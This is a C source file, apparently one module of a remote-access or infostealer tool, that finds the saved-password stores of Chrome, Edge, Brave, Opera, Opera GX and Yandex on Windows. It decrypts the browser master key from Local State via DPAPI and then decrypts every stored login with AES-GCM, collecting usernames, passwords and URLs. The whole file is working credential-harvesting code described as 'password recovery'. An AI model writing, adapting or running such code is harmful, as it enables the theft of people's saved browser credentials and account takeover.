/**
 * remote_passwords_chromium.c
 * Chromium browser password recovery (Chrome, Edge, Brave, Opera, Opera GX).
 * Requires SQLite amalgamation: add sqlite3.c and sqlite3.h to project, define REMOTE_USE_SQLITE.
 * Download from https://sqlite.org/download.html (sqlite-amalgamation-*.zip)
 */
#include "pch.h"
#include "remote_passwords.h"
#include "remote_log.h"
#include <ShlObj.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")

/* Add account helper (same as in remote_passwords.c) */
static int add_acc(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts,
    const char* username, const char* password, const char* url, const char* application) {
    if (!accounts || !n || *n >= max_accounts) return 0;
    remote_recovered_account_t* a = &accounts[*n];
    memset(a, 0, sizeof(*a));
    if (username) strncpy_s(a->username, sizeof(a->username), username, _TRUNCATE);
    if (password) strncpy_s(a->password, sizeof(a->password), password, _TRUNCATE);
    if (url) strncpy_s(a->url, sizeof(a->url), url, _TRUNCATE);
    if (application) strncpy_s(a->application, sizeof(a->application), application, _TRUNCATE);
    if (a->username[0] || a->url[0]) { (*n)++; return 1; }
    return 0;
}

#ifdef REMOTE_USE_SQLITE
#include "sqlite3.h"

/* Extract "encrypted_key" value from Local State JSON. Returns key (32 bytes) or 0 on failure. */
static int get_chromium_key(const char* local_state_path, unsigned char* key_out) {
    FILE* f = NULL;
    if (fopen_s(&f, local_state_path, "rb") != 0 || !f) return 0;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > 1024 * 1024) { fclose(f); return 0; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, (unsigned int)sz + 1);
    if (!buf) { fclose(f); return 0; }
    fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[sz] = '\0';

    const char* tag = "\"encrypted_key\":\"";
    const char* p = strstr(buf, tag);
    if (!p) { HeapFree(GetProcessHeap(), 0, buf); return 0; }
    p += strlen(tag);
    const char* q = strchr(p, '"');
    if (!q || (size_t)(q - p) > 4096) { HeapFree(GetProcessHeap(), 0, buf); return 0; }
    unsigned int b64_len = (unsigned int)(q - p);
    char* b64 = (char*)HeapAlloc(GetProcessHeap(), 0, b64_len + 1);
    if (!b64) { HeapFree(GetProcessHeap(), 0, buf); return 0; }
    memcpy(b64, p, b64_len);
    b64[b64_len] = '\0';

    /* Base64 decode */
    static const signed char b64tbl[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
    };
    unsigned char enc[512];
    unsigned int enc_len = 0;
    unsigned int v = 0, bits = 0;
    for (unsigned int i = 0; i < b64_len && enc_len < sizeof(enc); i++) {
        int b = b64tbl[(unsigned char)b64[i]];
        if (b < 0) { if (b64[i] == '=') break; continue; }
        v = (v << 6) | (unsigned int)b;
        bits += 6;
        if (bits >= 8) { enc[enc_len++] = (unsigned char)(v >> (bits - 8)); bits -= 8; }
    }
    HeapFree(GetProcessHeap(), 0, b64);
    HeapFree(GetProcessHeap(), 0, buf);
    if (enc_len < 5) return 0;  /* need at least DPAPI header */
    unsigned int blob_len = enc_len - 5;  /* skip "DPAPI" prefix (5 bytes) */

    /* DPAPI decrypt */
    DATA_BLOB in = { blob_len, enc + 5 };
    DATA_BLOB out = { 0 };
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return 0;
    if (out.cbData != 32) { LocalFree(out.pbData); return 0; }
    memcpy(key_out, out.pbData, 32);
    LocalFree(out.pbData);
    return 1;
}

/* Decrypt password: v10 = AES-GCM, else DPAPI */
static int decrypt_chromium_pass(const unsigned char* cipher, unsigned int cipher_len,
    const unsigned char* key, unsigned char* plain_out, unsigned int plain_size, unsigned int* plain_len) {
    if (cipher_len >= 3 && cipher[0] == 'v' && cipher[1] == '1' && cipher[2] == '0' && key) {
        /* AES-256-GCM: nonce 12 bytes at offset 3, ciphertext + tag after */
        if (cipher_len < 3 + 12 + 16 + 1) return 0;  /* nonce + at least 1 byte + 16 tag */
        const unsigned char* nonce = cipher + 3;
        unsigned int ct_len = cipher_len - 3 - 12 - 16;
        BCRYPT_ALG_HANDLE alg = NULL;
        BCRYPT_KEY_HANDLE key_hand = NULL;
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth;
        NTSTATUS st;
        int ok = 0;
        if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;
        if (BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, (ULONG)strlen(BCRYPT_CHAIN_MODE_GCM) + 1, 0) != 0) goto done;
        if (BCryptGenerateSymmetricKey(alg, &key_hand, NULL, 0, (PUCHAR)key, 32, 0) != 0) goto done;
        BCRYPT_INIT_AUTH_MODE_INFO(auth);
        auth.pbNonce = (PUCHAR)nonce;
        auth.cbNonce = 12;
        auth.pbTag = (PUCHAR)(cipher + cipher_len - 16);
        auth.cbTag = 16;
        ULONG written = 0;
        st = BCryptDecrypt(key_hand, (PUCHAR)(cipher + 3 + 12), ct_len, &auth, NULL, 0, plain_out, plain_size, &written, 0);
        if (st == 0) { *plain_len = written; ok = 1; }
done:
        if (key_hand) BCryptDestroyKey(key_hand);
        if (alg) BCryptCloseAlgorithmProvider(alg, 0);
        return ok;
    }
    /* DPAPI */
    DATA_BLOB in = { cipher_len, (BYTE*)cipher };
    DATA_BLOB out = { 0 };
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return 0;
    if (out.cbData >= plain_size) { LocalFree(out.pbData); return 0; }
    memcpy(plain_out, out.pbData, out.cbData);
    plain_out[out.cbData] = '\0';
    *plain_len = out.cbData;
    LocalFree(out.pbData);
    return 1;
}

/* Try one Chromium browser. */
static void try_chromium(const char* login_path, const char* local_state_path, const char* app_name,
    remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    if (GetFileAttributesA(login_path) == INVALID_FILE_ATTRIBUTES) return;
    unsigned char key[32];
    int has_key = get_chromium_key(local_state_path, key);
    sqlite3* db = NULL;
    if (sqlite3_open_v2(login_path, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    sqlite3_stmt* stmt = NULL;
    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        return;
    }
    while (sqlite3_step(stmt) == SQLITE_ROW && *n < max_accounts) {
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* user = sqlite3_column_text(stmt, 1);
        const void* pass_blob = sqlite3_column_blob(stmt, 2);
        int pass_len = sqlite3_column_bytes(stmt, 2);
        if (!url || !user) continue;
        const char* url_str = (const char*)url;
        const char* user_str = (const char*)user;
        if (!url_str[0] || !user_str[0]) continue;
        char pass_plain[2048];
        unsigned int pass_plain_len = 0;
        if (pass_blob && pass_len > 0) {
            if (!decrypt_chromium_pass((const unsigned char*)pass_blob, (unsigned int)pass_len, has_key ? key : NULL, (unsigned char*)pass_plain, sizeof(pass_plain), &pass_plain_len))
                pass_plain[0] = '\0';
            else
                pass_plain[pass_plain_len] = '\0';
        } else
            pass_plain[0] = '\0';
        add_acc(accounts, n, max_accounts, user_str, pass_plain, url_str, app_name);
    }
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void remote_passwords_collect_chromium(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    char local[MAX_PATH], app[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local))) return;
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, app))) return;

    char login[MAX_PATH], state[MAX_PATH];
    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\Google\\Chrome\\User Data\\Default\\Login Data", local);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\Google\\Chrome\\User Data\\Local State", local);
    try_chromium(login, state, "Chrome", accounts, n, max_accounts);

    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\Microsoft\\Edge\\User Data\\Default\\Login Data", local);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\Microsoft\\Edge\\User Data\\Local State", local);
    try_chromium(login, state, "Microsoft Edge", accounts, n, max_accounts);

    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", local);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\BraveSoftware\\Brave-Browser\\User Data\\Local State", local);
    try_chromium(login, state, "Brave", accounts, n, max_accounts);

    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\Opera Software\\Opera Stable\\Login Data", app);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\Opera Software\\Opera Stable\\Local State", app);
    try_chromium(login, state, "Opera", accounts, n, max_accounts);

    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\Opera Software\\Opera GX Stable\\Login Data", app);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\Opera Software\\Opera GX Stable\\Local State", app);
    try_chromium(login, state, "Opera GX", accounts, n, max_accounts);

    _snprintf_s(login, sizeof(login), _TRUNCATE, "%s\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data", local);
    _snprintf_s(state, sizeof(state), _TRUNCATE, "%s\\Yandex\\YandexBrowser\\User Data\\Local State", local);
    try_chromium(login, state, "Yandex", accounts, n, max_accounts);
}

#else
/* Stub when SQLite not available */
void remote_passwords_collect_chromium(remote_recovered_account_t* accounts, unsigned int* n, unsigned int max_accounts) {
    (void)accounts;
    (void)n;
    (void)max_accounts;
}
#endif
